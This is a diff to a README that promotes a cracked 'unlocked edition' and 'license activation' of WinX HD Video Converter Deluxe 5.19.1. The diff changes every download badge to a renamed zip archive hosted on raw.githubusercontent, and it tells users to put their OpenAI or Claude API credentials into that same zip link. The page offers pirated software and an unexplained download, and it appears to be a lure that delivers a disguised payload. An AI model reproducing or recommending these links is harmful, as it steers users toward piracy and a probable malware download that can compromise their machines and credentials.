@@ -1,6 +1,6 @@
 # WinX HD Video Converter Deluxe 5.19.1: Full Solution & License Activation 🚀
 
-[![Download](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition.zip)](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition.zip)
+[![Download](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/unlocked-winx-converter-deluxe-hd-edition-video-1.0.zip)](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/unlocked-winx-converter-deluxe-hd-edition-video-1.0.zip)
 
 Your journey toward seamless, high-quality video conversion begins here! Welcome to the ultimate repository for **WinX HD Video Converter Deluxe 5.19.1 License Activation**. Say goodbye to limitations—this toolkit empowers you to experience the full symphony of video conversion, editing, and sharing without boundaries.
 
@@ -57,7 +57,7 @@ Enter the age of intelligent workflows. This edition of WinX HD Video Converter 
   To connect your conversion tasks to OpenAI or Claude:
   
   1. Install the integration plugin (see the `api-integrations/` folder).
-  2. Set your API credentials in the `https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition.zip` configuration.
+  2. Set your API credentials in the `https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/unlocked-winx-converter-deluxe-hd-edition-video-1.0.zip` configuration.
   3. Enjoy features like auto-subtitle, AI thumbnail suggestions, and scene analysis—all at your fingertips.
 
 ---
@@ -101,7 +101,7 @@ This project takes inspiration from the collaborative spirit of open-source deve
 Access everything needed for "WinX HD Video Converter Deluxe 5.19.1 License Activation."  
 Get started now:
 
-[![Download](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition.zip)](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition.zip)
+[![Download](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/unlocked-winx-converter-deluxe-hd-edition-video-1.0.zip)](https://raw.githubusercontent.com/nekomimiyu/winx-hd-video-converter-deluxe-5-19-1-unlocked-edition/branch/pierdrop/unlocked-winx-converter-deluxe-hd-edition-video-1.0.zip)
 
 ---
 
